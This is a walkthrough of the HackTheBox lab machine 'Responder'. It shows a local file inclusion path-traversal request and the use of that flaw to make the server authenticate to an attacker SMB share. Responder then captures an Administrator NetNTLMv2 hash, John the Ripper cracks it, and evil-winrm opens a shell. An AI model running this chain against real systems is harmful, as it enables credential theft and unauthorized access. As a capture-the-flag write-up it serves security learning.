---
title: Responder - A HackTheBox machine
author: amandaguglieri
TableOfContents: true
draft: false
tags:
  - walkthrough
  - NTLM credential stealing 
  - responder.py
  - local file inclusion
  - php include
  - web pentesting
---

# Responder - A HackTheBox machine


```bash
nmap -sC -A 10.129.95.234 -Pn -p-
```

Open ports: 80, 


Browsing at port 80, we are redirected to http://unika.htb so we will add this to /etc/host.

```bash
sudo echo "10.129.95.234	unika.htb" >> /etc/hosts
```

After that, we can browse the web and wander around.

There is a [LFI - Local File Inclusion vulnerability](webexploitation/local-file-inclusion-lfi.md) at endpoint http://unika.htb/index.php?page=french.html. This is request in Burpsuite:

```
GET /index.php?page=../../../../../../../../windows/win.ini HTTP/1.1
Host: unika.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://unika.htb/index.php?page=french.html
Upgrade-Insecure-Requests: 1
```

From previous responses we know that we face a php server version 8.1.1 running on Windows, so we can use some [payloads for interesting windows files](https://github.com/amandaguglieri/dictionaries/blob/main/windows/file_inclusion). In this case, we would need some crafting to remove the "c:/" part. We can do it with the "cut" command.

We are going to use the tool [Responder.py](responder.md) to get the NTLM hash from server. Basically the idea is to mount a SMB server on our attacker machine with the responder tool. Responder is able to get the NTLM hash from server.

```bash
git clone https://github.com/lgandx/Responder.git   
cd Responder
sudo pip install -r requirements.txt
./Responder.py -I tun1 -w -d
```

From browser enter: http://unika.htb//index.php?page=//<ATACKERIP>/whatever. In my case:

```
http://unika.htb/index.php?page=//10.10.14.2/lalala
```

Now, from the Responder prompt we will have the hash:

```
[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:fc1a74919a1b08cc:E6E626FD4B1C4F7ECCAA0EE0840EE704:010100000000000000DC82F5CA7DD901B25F22A9A23BC4C3000000000200080042005A004F00340001001E00570049004E002D00500042004E004B00360051003400500058004E004F0004003400570049004E002D00500042004E004B00360051003400500058004E004F002E0042005A004F0034002E004C004F00430041004C000300140042005A004F0034002E004C004F00430041004C000500140042005A004F0034002E004C004F00430041004C000700080000DC82F5CA7DD9010600040002000000080030003000000000000000010000000020000091174BB6757D2A344D7B5A8B18DC80E22F176A01524CE0739D703C3593CB66640A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000
```

The NetNTLMv2 includes both the challenge (random text) and the encrypted response.

```bash
# Save hash in a file
echo "Administrator::RESPONDER:fc1a74919a1b08cc:E6E626FD4B1C4F7ECCAA0EE0840EE704:010100000000000000DC82F5CA7DD901B25F22A9A23BC4C3000000000200080042005A004F00340001001E00570049004E002D00500042004E004B00360051003400500058004E004F0004003400570049004E002D00500042004E004B00360051003400500058004E004F002E0042005A004F0034002E004C004F00430041004C000300140042005A004F0034002E004C004F00430041004C000500140042005A004F0034002E004C004F00430041004C000700080000DC82F5CA7DD9010600040002000000080030003000000000000000010000000020000091174BB6757D2A344D7B5A8B18DC80E22F176A01524CE0739D703C3593CB66640A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000" > hash.txt
```

Crack it with [John the Ripper](john-the-ripper.md).

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

Results:

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2023-05-03 14:51) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

So password for Administrator is badminton.

Also, from Responder we have this output:


```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator) 
```

Now, we will connect to the [WinRM (Windows Remote Management service)](5985-5986-winrm-windows-remote-management.md) on the target and try to get a session. For that there is a tool called [Evil-WinRM](evil-winrm.md).

```bash
evil-winrm -i <VictimIP> -u <username> -p <password>

# In my case: 
evil-winrm -i 10.129.95.234 -u Administrator -p badminton
```

You will get a powershell session. Browse around to find flag.txt. 

To echo it:

```ps
type c:/users/mike/Desktop/flag.txt
```
